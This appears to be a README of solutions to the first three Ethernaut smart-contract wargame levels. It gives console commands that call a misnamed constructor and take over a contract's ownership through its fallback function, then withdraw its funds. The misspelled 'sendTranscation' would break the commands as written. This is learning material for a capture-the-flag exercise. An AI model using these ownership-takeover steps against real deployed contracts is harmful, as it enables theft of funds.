# ethernaut-solve
https://ethernaut.openzeppelin.com/

### Hello Ethernaut
```
await contract.authenticate(await contract.address())
```

### Fallback
```
await sendTranscation({from:player, to:contract.address, value:1, data:"0xd7bb99ba"}) // call contribute
await sendTranscation({from:player, to:contract.address, value:1}) // fallback and take owner
await sendTranscation({from:player, to:contract.address, data:"0x3ccfd60b"}) // withdraw
```

### Fallout
낮은 버전 solidity에서 constructor 네이밍 실수
```
await sendTranscation({from:player, to:contract.address, data:"0x6fab5ddf"}) // call Fal1out
```
